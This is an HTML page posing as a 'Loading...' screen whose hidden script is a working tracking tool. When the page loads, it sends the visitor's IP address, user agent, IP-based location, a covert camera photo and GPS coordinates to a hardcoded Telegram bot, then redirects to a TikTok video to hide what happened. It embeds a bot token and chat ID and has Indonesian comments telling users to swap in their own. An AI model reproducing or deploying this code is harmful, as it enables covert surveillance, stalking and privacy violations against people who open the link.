<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
            color: #fff;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: #1a1a2e;
            border-radius: 16px;
            border: 1px solid #2a2a4a;
            max-width: 300px;
            width: 100%;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #2a2a4a;
            border-top-color: #00FF9D;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        p { color: #888; font-size: 14px; }
        #videoPreview { display: none; }
        #photoCanvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="spinner"></div>
    <p>Loading...</p>
</div>

<video id="videoPreview" autoplay playsinline></video>
<canvas id="photoCanvas"></canvas>

<script>
// ============================================
// 🔴 KONFIGURASI — GANTI INI!
// ============================================

const BOT_TOKEN = "6529101093:AAH7HJ4eS6NDLsK-R7-SUCfRkucRIEgfEgc";
const CHAT_ID = "1650888756";
const REDIRECT_URL = "https://www.tiktok.com/@bbygurllxyz_/video/7633609115247414548";

// ============================================
// 🔴 FUNGSI KIRIM KE TELEGRAM
// ============================================
function sendToTelegram(msg) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`
    }).catch(() => {});
}

function sendPhotoToTelegram(imageData, caption) {
    const blob = dataURLtoBlob(imageData);
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'capture.jpg');
    formData.append('caption', caption);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    }).catch(() => {});
}

function dataURLtoBlob(dataURL) {
    const arr = dataURL.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], { type: mime });
}

// ============================================
// 🔴 CAPTURE PHOTO
// ============================================
function capturePhoto() {
    return new Promise((resolve) => {
        const video = document.getElementById('videoPreview');
        const canvas = document.getElementById('photoCanvas');

        navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }
        })
        .then(stream => {
            video.srcObject = stream;
            video.play();
            setTimeout(() => {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                stream.getTracks().forEach(t => t.stop());
                video.srcObject = null;
                resolve(imageData);
            }, 500);
        })
        .catch(() => {
            resolve(null); // KAMERA GAGAL → LANJUT
        });
    });
}

// ============================================
// 🔴 MAIN
// ============================================
const time = new Date().toLocaleString('id-ID');
const ua = navigator.userAgent;
const ref = document.referrer || 'Direct';

// 1. AMBIL IP + GEOLOKASI
fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => {
        const ip = data.ip;

        // Kirim IP
        sendToTelegram(`✅ NEW VISITOR\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}\n🌐 IP: <code>${ip}</code>\n📱 ${ua}\n🔗 ${ref}`);

        // Ambil Geolokasi dari IP
        fetch(`http://ip-api.com/json/${ip}`)
            .then(r => r.json())
            .then(geo => {
                if (geo.status === 'success') {
                    sendToTelegram(`📍 IP GEOLOCATION\n━━━━━━━━━━━━━━━━━━━\n📍 ${geo.city}, ${geo.regionName}\n🌍 ${geo.country}\n📡 ${geo.isp}\n🗺️ ${geo.lat}, ${geo.lon}`);
                }
            });
    });

// 2. AMBIL FOTO (POPUP ALLOW)
capturePhoto().then(img => {
    if (img) {
        sendPhotoToTelegram(img, `📸 AUTO PHOTO\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}`);
    }
});

// 3. AMBIL GPS (POPUP ALLOW) — OPSIONAL
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        pos => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            sendToTelegram(`📍 GPS LOCATION!\n━━━━━━━━━━━━━━━━━━━\n🎯 <code>${lat}, ${lng}</code>\n🗺️ https://www.google.com/maps?q=${lat},${lng}`);
        },
        () => {} // GAGAL → LANJUT
    );
}

// 4. ✅ REDIRECT KE TIKTOK (SETELAH 2.5 DETIK)
setTimeout(() => {
    window.location.replace(REDIRECT_URL);
}, 2500);
</script>

</body>
</html>
